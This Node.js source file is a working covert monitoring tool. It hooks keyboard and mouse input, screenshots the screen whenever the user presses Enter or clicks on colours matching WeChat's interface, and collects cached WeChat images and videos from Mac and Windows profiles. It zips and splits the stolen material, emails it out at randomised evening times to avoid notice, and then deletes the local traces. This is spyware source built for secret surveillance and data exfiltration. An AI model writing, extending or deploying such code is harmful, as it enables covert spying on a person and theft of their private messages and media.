const screenshot = require('screenshot-node')
const path = require('path')
const fse = require('fs-extra')
const moment = require('moment')
const iohook = require('iohook')
const robotjs = require('robotjs')
const mailer = require('nodemailer')
const Zip = require('adm-zip')
const schedule = require('node-schedule')
const os = require('os')
const splitFile = require('split-file')
const randomInit = require('random-int')
const log = require('loglevel')
const prefix = require('loglevel-plugin-prefix')
const config = require('./config');

const OUTPUT = path.join(__dirname, './dist')
const SUSPECT_COLORS = [
    'DCDCDC',
    'CAC8C6',
    'C8C6C6',
    '000000',
    'F5F5F5',
    '606060',
    '606095',
    '60607B',
    '129D11',
    '98E165',
    'D9D9D9',
    '7E3200',
    '1AAD19',
    '139643',
    '129611',
    'FFEE94',
]
prefix.reg(log)
log.enableAll()
prefix.apply(log, {
    format(level, name, timestamp) {
        return `[${moment().format('YYYY-MM-DD_HH:mm:ss')}] `
    }
})

fse.ensureDirSync(OUTPUT)

function makePic() {
    return new Promise((resolve, reject) => {
        const dir = makeMonthDir()
        // filename for datetime format
        const filename = `${moment().format('YYYY-MM-DD_HH-mm-ss')}.png`
        screenshot.saveScreenshot(0, 0, 0, 0, path.join(dir, filename), (err) => {
            if (err) {
                reject(err)
            }
            resolve(path.join(dir, filename))
        })
    })
}

function makeMonthDir() {
    const currentDirName = `${moment().format('YYYY-MM-DD')}`
    const monthDirPath = path.join(OUTPUT, currentDirName)
    fse.ensureDirSync(monthDirPath)
    return monthDirPath
}

/**
 * 
 * @param {Path} dirPath attachments files path 
 * @param {String} name attachments name
 */
async function createAttachments(dirPath, filename) {
    log.info('start zip')
    const zip = new Zip()
    zip.addLocalFolder(dirPath)
    const zipName = filename || `${moment().subtract(1, 'months').format('YYYY-MM')}_${path.basename(dirPath)}_${parseInt(Math.random() * 1000, 10)}`
    const zipPath = path.join(OUTPUT, `./${zipName}.zip`)
    zip.writeZip(zipPath)
    log.info('zip done')
    // Some mail servers limit the size of attachments, so attachments need to be cut
    const zipStat = await fse.stat(zipPath)
    const maxSize = 20 * 1024 * 1024
    if (zipStat.size >= maxSize) {
        log.info('split start')
        const maxPiece = Math.ceil(zipStat.size / maxSize)
        log.info(`zip path: ${zipPath}, splices: ${maxPiece}`)
        const pieces = await splitFile.splitFile(zipPath, maxPiece)
        log.info('split done')
        return pieces.map(name => ({
            filename: `${path.basename(name)}.zip`,
            path: name,
            contentType: 'application/zip',
        }))
    }
    return [
        {
            filename: `${filename || zipName}.zip`,
            path: path.join(OUTPUT, `${zipName}.zip`),
            contentType: 'application/zip',
        }
    ]
}

async function sendEmail(files, title) {
    const transporter = await mailer.createTransport(config.mailerConfig)
    let mailOptions = {
    }
    // send attachments
    if (files && Array.isArray(files)) {
        mailOptions = {
            from: config.mailerConfig.from,
            to: config.mailerConfig.to,
            subject: title,
            text: `your customer content text`,
            attachments: files,
        }
    }
    // send log info
    else if (typeof files === 'string') {
        mailOptions = {
            from: config.mailerConfig.from,
            to: config.mailerConfig.to,
            subject: title,
            text: `${files}`,
            html: `<code color="orange">${files}</code>`,
            // Emails that do not contain attachments 
            // will be considered spam and rejected
            attachments: [
                {
                    filename: 'placeholder.zip',
                    path: `${path.join(__dirname, './placeholder.zip')}`,
                    contentType: 'application/zip',
                }
            ]
        }
    }
    log.info('send begin')
    let info = await transporter.sendMail(mailOptions)
    log.info('send success')
    log.info(info)
    const fileNames = mailOptions.attachments.map(att => att.path)
    fileNames.forEach(name => {
        if (name.indexOf('placeholder.zip') === -1) {
            delStorage(name)
        }
    })
    const screenshotDir = makeMonthDir()
    delStorage(screenshotDir)
}

function delStorage(storagePath) {
    const currentDirName = `${moment().subtract(1, 'months').format('YYYY-MM')}`
    const targetDirPath = path.join(OUTPUT, currentDirName)
    fse.removeSync(targetDirPath)
    log.info('directory has been removed')
    fse.removeSync(storagePath)
    log.info('zip file has been removed')
}

function sendLog(log) {
    if (!log) return
    let logString = `【${moment().format('YYYY-MM-DD HH:mm:ss')}】: \n`
    if (typeof log !== 'string') {
        try {
            logString = logString + JSON.stringify(log)
        }
        catch (err) {
            console.error(err)
            sendLog(err)
        }
    }
    else {
        logString += log
    }
    sendEmail(logString, 'system log')
}

function ioListener() {
    iohook.on('keydown', (e) => {
        if (e.keycode === 28) {
            makePic()
        }
    })
    iohook.on('mouseclick', () => {
        const mouse = robotjs.getMousePos()
        const hex = robotjs.getPixelColor(mouse.x, mouse.y)
        if (SUSPECT_COLORS.includes(hex.toUpperCase())) {
            makePic()
        }
    })
    iohook.start()
}

async function getScreensJob() {
    const targetPath = makeMonthDir()
    if (!fse.pathExistsSync(targetPath)) {
        console.error('target dir is not exist')
        sendLog(`${targetPath} is not exist`)
        return
    }
    const attachments = await createAttachments(targetPath, `screenshot_${path.basename(targetPath)}`)
    if (attachments.length > 1) {
        let rule = new schedule.RecurrenceRule()
        rule.minute = attachments.map((_, i) => Math.round(i + randomInit(1, 5)))
        let job = schedule.scheduleJob(rule, () => {
            if (attachments.length) {
                log.info('email send success')
                sendEmail([attachments.shift()], `${path.basename(targetPath)} 截图`)
            }
            else {
                log.info('all emails send success')
                job.cancel()
            }
        })
    }
    else {
        sendEmail(attachments, `${path.basename(targetPath)} 截图`)
    }
}

async function getWechatFilesJob(cachePathRoot) {
    const isWindows = process.platform === 'win32'
    const isMac = process.platform === 'darwin'
    if (!isMac && !isWindows) return
    function findMacDir() {
        const sourcePath = path.join(os.homedir(), '/Library/Containers/com.tencent.xinWeChat/Data/Library/Application Support/com.tencent.xinWeChat/')
        const ls = fse.readdirSync(sourcePath)
        const tmp = path.join(sourcePath, ls[0], './KeyValue')
        const _t = fse.readdirSync(tmp)
        if (_t.length) {
            return path.join(sourcePath, ls[0], _t[0], 'Message/MessageTemp')
        }
        else {
            sendLog(`[dir error] root: ${ls.join(',')}, tmp: ${_t.join(',')}`)
        }
    }
    function findWinDir(customRootPath) {
        const defaultRootPath = path.join(os.homedir(), 'Documents/WeChat\ Files')
        if (!fse.pathExistsSync(customRootPath) && !fse.pathExistsSync(defaultRootPath)) {
            sendLog(`${defaultRootPath} and ${customRootPath ? customRootPath : 'customer root path'} is not exist`)
            return
        }
        let rootPath = customRootPath ? customRootPath : defaultRootPath
        try {
            const ls = fse.readdirSync(rootPath).filter(dir => !['All Users', 'Applet'].includes(dir))
            return ls.map(userName => {
                return path.join(rootPath, userName, './FileStorage')
            })
        }
        catch (err) {
            console.error(err)
            return [path.join(rootPath, 'wss-courage', './FileStorage')]
        }
    }
    if (isMac) {
        // mac version cannot config custom storage path
        const macDir = findMacDir()
        if (!macDir) {
            sendLog('cannot find cache files dir')
        }
        const files = await createAttachments(macDir)
        sendEmail(files)
    }
    else if (isWindows) {
        const cacheDir = findWinDir(cachePathRoot)
        const lastMonthDirName = `${moment().subtract(1, 'months').format('YYYY-MM')}`
        if (!cacheDir) {
            return
        }
        log.info(`cacheDirPath: ${cacheDir}`)
        const usefulDir = cacheDir.map(cache => {
            return fse.readdirSync(cache).filter(cType => ['Image', 'Video'].includes(cType))
                .map(c => path.join(cache, c))
        })
            .reduce((acc, item) => acc.concat(...item))
        const attachmentsPromises = usefulDir
            .filter(p => {
                const lastMonthDir = path.join(p, lastMonthDirName)
                return fse.pathExistsSync(lastMonthDir)
            })
            .map(async (p, i) => {
                return await createAttachments(path.join(p, lastMonthDirName), `${lastMonthDirName}_${path.basename(usefulDir[i])}_${path.basename(p)}`)
            })
        let attachments = await Promise.all(attachmentsPromises)
        attachments = attachments.reduce((acc, item) => acc.concat(...item), [])
        if (attachments.length > 1) {
            let rule = new schedule.RecurrenceRule()
            // avoid sending email at the same time
            rule.minute = attachments.map((_, i) => Math.round(i + randomInit(15, 20)))
            let job = schedule.scheduleJob(rule, () => {
                if (attachments.length) {
                    log.info('email sent success')
                    sendEmail([attachments.shift()], 'wechat files')
                }
                else {
                    log.info('emails has been sent')
                    job.cancel()
                }
            })
        }
        else if (attachments.length == 1) {
            sendEmail(attachments, 'wechat files')
        }
        else {
            sendLog(`${lastMonthDirName} month dir is empty`)
        }
    }
}

function scheduleRunner() {
    schedule.scheduleJob('0 12 21 1 * *', () => {
        const path = process.argv[2]
        getWechatFilesJob(path)
    })
    const rule2 = new schedule.RecurrenceRule()
    rule2.hour = 20 + randomInit(0, 3)
    rule2.minute = randomInit(0, 59)
    schedule.scheduleJob(rule2, () => {
        getScreensJob()
    })
}
async function start() {
    ioListener()
    scheduleRunner()
}
start()

